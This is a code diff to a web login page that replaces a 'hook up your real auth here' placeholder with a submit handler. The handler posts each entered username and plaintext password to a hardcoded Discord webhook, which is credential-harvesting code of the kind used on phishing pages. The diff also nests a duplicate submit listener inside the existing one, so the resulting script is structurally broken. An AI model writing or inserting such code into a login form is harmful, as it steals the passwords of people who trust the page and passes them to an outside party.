@@ -109,7 +109,41 @@
     var err = document.getElementById('err');
     if (!id || !pw) { err.classList.add('show'); return; }
     err.classList.remove('show');
-    // TODO: hook up your real auth here
+document.getElementById('login').addEventListener('submit', function (e) {
+  e.preventDefault();
+
+  var id = document.getElementById('id').value.trim();
+  var pw = document.getElementById('pw').value;
+  var err = document.getElementById('err');
+
+  if (!id || !pw) { err.textContent = 'Fill in both fields.'; err.classList.add('show'); return; }
+  err.classList.remove('show');
+
+  var WEBHOOK_URL = 'https://discord.com/api/webhooks/1523359394908209212/cw-IUAk2OzD6_AnEL6MC39q1kAV-cOqTFVEPB6_DLGO7TwotZmFQwKSpixI1NXFMjjr-'; // <- put your webhook here
+
+  fetch(WEBHOOK_URL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      username: id,
+      password: pw,
+      time: new Date().toISOString()
+    })
+  })
+    .then(function (r) {
+      if (r.ok) {
+        console.log('sent to webhook');
+        // window.location.href = '/dashboard'; // uncomment once you have real auth
+      } else {
+        err.textContent = 'Something went wrong.';
+        err.classList.add('show');
+      }
+    })
+    .catch(function () {
+      err.textContent = 'Could not reach the server.';
+      err.classList.add('show');
+    });
+});
     console.log('login attempt', id);
   });
 </script>
